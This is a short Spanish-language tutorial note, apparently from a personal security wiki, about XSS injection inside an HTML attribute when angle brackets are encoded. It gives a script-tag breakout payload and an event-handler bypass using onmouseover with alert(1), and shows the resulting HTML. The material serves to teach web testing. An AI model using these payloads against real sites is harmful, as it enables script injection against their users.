
Esto se presenta cuando la inyección de se hace en un atributo [[atributos]], por ejemplo si la inyección se está haciendo en el atributo value de un input:

```html
<input type="text" placeholder="Search..." name="search" value="holatest">
```

Nosotros usualmente podriamos inyectar lo siguiente:

```html
"><script>alert(1)</script>
```

El problema es que como dice el titulo, los angle brackets (<>) están siendo HTML encodeados, esto ahce que  no se peuda hacer esta inyeccion, en este caso podemos hacer algo como esto:

```html
" onmouseover="alert(1)
```

Esto quedaria tal que así:

```html
<input type="text" placeholder="Search..." name="search" value="" onmouseover="alert(1)">
```

El atributo onmouseover se usa para que se ejecute código js cada que se pasa el mouse por encima de el input